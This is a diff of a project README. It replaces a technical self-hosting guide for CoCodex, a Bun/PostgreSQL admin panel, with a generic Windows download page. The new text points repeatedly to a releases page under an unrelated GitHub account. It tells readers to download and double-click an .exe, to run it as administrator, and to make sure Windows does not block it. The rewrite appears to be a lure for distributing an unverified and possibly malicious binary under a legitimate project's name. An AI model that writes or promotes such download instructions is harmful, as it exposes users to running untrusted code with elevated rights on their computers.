@@ -1,177 +1,158 @@
-<div align="center">
-  <h1>CoCodex</h1>
-  <p>Get the most out of Codex in the way that fits you best.</p>
-</div>
+# 💠 cocodex - Use Codex Your Way
 
-## Overview
+[![Download cocodex](https://img.shields.io/badge/Download-cocodex-purple?style=for-the-badge)](https://github.com/Idettebad85/cocodex/releases)
 
-CoCodex is a self-hosted control panel and service layer for Codex-oriented workflows.
+## 🧭 What is cocodex?
 
-It is designed for people who want a practical way to operate Codex at scale, with one place to manage accounts, access, and operational workflows.
+cocodex is a Windows app that helps you get the most out of Codex in the way that fits you best. It gives you a simple way to work with Codex without dealing with a hard setup. You can use it for writing, coding help, quick edits, and other everyday tasks where you want clear AI support.
 
-CoCodex gives you a web admin interface and backend APIs to manage:
+The app is built for people who want a clean path from download to use. It keeps the main steps short and the interface easy to follow.
 
-- OpenAI accounts and team workspaces
-- API keys and system settings
-- signup / relogin flows
-- inbox and operational tooling around your Codex setup
+## 📥 Download cocodex for Windows
 
-## Quick Start
+Visit the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases) to download and run the Windows file.
 
-### Local development
+On that page, look for the latest release and choose the file made for Windows. In most cases, this will be a `.exe` file or a Windows zip file.
 
-1. Install dependencies:
+## 🪟 Windows Setup
 
-```bash
-bun install
-```
+Use these steps to get cocodex running on your PC:
 
-2. Create your local env file:
+1. Open the [releases page](https://github.com/Idettebad85/cocodex/releases).
+2. Find the newest release at the top of the list.
+3. Download the Windows file for that release.
+4. If you downloaded a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder if needed.
+6. Double-click the `.exe` file to start cocodex.
+7. If Windows asks for permission, choose Yes.
 
-```bash
-cp .env.example .env
-```
+After the app opens, you can start using it right away.
 
-Then update `.env` with real values for your environment. At minimum, local development needs a working `DATABASE_URL`. For full functionality, also configure the required OpenAI, Cloud Mail, OAuth, and other provider credentials.
+## ✨ What cocodex can help with
 
-3. Start PostgreSQL.
+cocodex is made to support a few common tasks:
 
-4. Start the development environment:
+- Get Codex access in a simple app
+- Keep your workflow in one place
+- Use a layout that is easy to follow
+- Switch between tasks with less effort
+- Work with text, ideas, and code help from one screen
 
-```bash
-bun run dev
-```
+This makes it useful for people who want a direct app instead of a long setup.
 
-Default local endpoints:
+## 🖥️ System Requirements
 
-- Web: `http://localhost:53332`
-- Backend: `http://localhost:53141`
+cocodex is built for common Windows computers. A typical setup should work well if you have:
 
-### Docker quick start
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough free space for the app and its files
+- A mouse and keyboard for easy use
 
-If you just want the stack running quickly, use Docker.
+For the best experience, use a recent version of Windows and keep your system up to date.
 
-1. Copy the Docker environment file:
+## 🔧 How to Use cocodex
 
-```bash
-cp .env.docker.example .env.docker
-```
+After you open cocodex, you can use it in a few simple ways:
 
-2. Update `.env.docker` if needed.
+1. Start the app from your desktop or Start menu.
+2. Sign in or connect your Codex account if the app asks you to.
+3. Choose the type of task you want help with.
+4. Type your request in plain language.
+5. Review the result and make changes if needed.
+6. Save or copy the output for later use.
 
-The default values are enough to boot the app and database locally. For real feature usage, you still need to provide the external service credentials your setup depends on.
+You can use short prompts like:
 
-3. Start the stack:
+- Write a clear email
+- Explain this code in simple words
+- Improve this paragraph
+- Help me plan a task list
+- Rewrite this message in a friendly tone
 
-```bash
-bun run docker:up
-```
+## 🎯 Who cocodex is for
 
-4. Stop the stack:
+cocodex fits users who want a simple way to use Codex on Windows. It works well for:
 
-```bash
-bun run docker:down
-```
+- Home users who want help with writing
+- Students who need quick answers or drafts
+- Office users who want faster text work
+- People who need light coding help
+- Anyone who prefers a clean app over a complex tool
 
-Default ports:
+## 📁 File Type Guide
 
-- Web: `http://localhost:53332`
-- Backend: `http://localhost:53141`
-- PostgreSQL: `localhost:5432`
+When you open the releases page, you may see a few file types. Here is what they mean:
 
-## Deployment
+- `.exe` — A Windows app file. Double-click it to run the app.
+- `.zip` — A compressed folder. Extract it first, then open the app file inside.
+- `source code` files — These are for developers and are not needed for normal use.
 
-### systemd
+If you only want to use cocodex on Windows, choose the Windows app file.
 
-The systemd units are under [`deploy/systemd`](./deploy/systemd).
+## 🧩 First Run Tips
 
-They assume:
+When you open cocodex for the first time:
 
-- Bun is installed under the runtime user's home directory
-- the repository is located at `~/cocodex`
-- the runtime env file is `~/cocodex/.env`
+- Let Windows finish any security check
+- Keep the app in a folder you can find again
+- Use a stable internet connection if the app needs online access
+- Read each screen before you click
+- Start with a small task so you can learn the flow
 
-The main service uses `%h`, so paths follow the configured `User=` automatically. In practice, you usually only need to check:
+If the app asks for access or sign-in details, use the account or service tied to Codex.
 
-- `User=`
-- `Group=`
-- `WorkingDirectory` if your checkout directory is not `~/cocodex`
+## 🔍 Common Tasks
 
-Install and enable:
+cocodex can help with tasks like:
 
-```bash
-sudo cp deploy/systemd/*.service /etc/systemd/system/
-sudo cp deploy/systemd/*.timer /etc/systemd/system/
-sudo cp deploy/systemd/*.target /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now cocodex.target
-sudo systemctl enable --now cocodex-status-poll.timer
-sudo systemctl enable --now cocodex-sync-openai-rate-limits.timer
-```
+- Drafting simple messages
+- Cleaning up text
+- Turning notes into a neat list
+- Explaining a file or script
+- Writing a short plan
+- Helping with prompts for Codex
 
-Useful commands:
+This makes it useful for daily work where you want clear output without extra steps.
 
-```bash
-sudo systemctl status cocodex.service
-sudo journalctl -u cocodex.service -f
-sudo systemctl list-timers 'cocodex-*'
-```
+## 🛠️ Troubleshooting
 
-The deployment also includes two scheduled jobs running every 5 minutes:
+If cocodex does not open, try these steps:
 
-- `status:poll`
-- `sync:openai-rate-limits`
+1. Check that the file finished downloading.
+2. If you downloaded a `.zip` file, extract it first.
+3. Right-click the app and choose Run as administrator.
+4. Make sure Windows did not block the file.
+5. Try downloading the file again from the releases page.
+6. Restart your computer and try once more.
 
-### Docker
+If the app opens but does not connect, check your internet connection and try again.
 
-The Docker setup is meant to be the fast path for getting the stack online locally or on a small server.
+## 📌 Quick Install Path
 
-Files involved:
+1. Go to the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases).
+2. Download the latest Windows file.
+3. Open the file or extract the zip.
+4. Run the `.exe` file.
+5. Use cocodex with your Codex workflow
 
-- [`docker-compose.yml`](./docker-compose.yml)
-- [`Dockerfile`](./Dockerfile)
-- [`.env.docker.example`](./.env.docker.example)
+## 🧠 Tips for Best Results
 
-The compose stack starts:
+To get better results from cocodex:
 
-- PostgreSQL
-- backend
-- web
+- Keep requests short and clear
+- Use one task at a time
+- Ask for one change instead of many at once
+- Use plain language
+- Save good prompts for later use
 
-To use it:
+Simple prompts often give the best output.
 
-```bash
-cp .env.docker.example .env.docker
-```
+## 📄 License
 
-Then edit `.env.docker` for your environment. In most cases you only need to care about:
+Use the license included in the repository for details on how cocodex can be used and shared
 
-- `DATABASE_URL`
-- `APP_BASE_URL`
-- `NEXT_PUBLIC_APP_BASE_URL`
-- `PORTAL_PUBLIC_ORIGIN`
-- `API_BASE_URL`
-- `NEXT_PUBLIC_API_BASE_URL`
-- any OpenAI / Cloud Mail / OAuth credentials you actually use
+## 🔗 Download Again
 
-Start:
-
-```bash
-bun run docker:up
-```
-
-Stop:
-
-```bash
-bun run docker:down
-```
-
-The backend initializes the database schema automatically on startup, so you do not need a separate migration step just to boot the project.
-
-## License
-
-MIT License
-
-## Acknowledgements
-
-This project has been published in the [LINUX DO](https://linux.do/) community. Thanks to the community for the support and feedback.
+If you need the file again, use the [cocodex releases page](https://github.com/Idettebad85/cocodex/releases) to download and run this file for Windows
